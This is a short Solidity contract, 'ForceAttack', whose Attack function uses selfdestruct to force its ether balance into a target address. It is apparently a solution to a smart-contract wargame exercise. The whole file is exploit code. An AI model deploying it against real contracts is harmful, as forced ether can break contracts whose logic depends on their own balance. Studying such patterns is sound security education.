// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {

    address private owner;
    constructor()  payable{
        owner = msg.sender;
    }

    function Attack(address _force) external {
        selfdestruct(payable(_force));
    }
}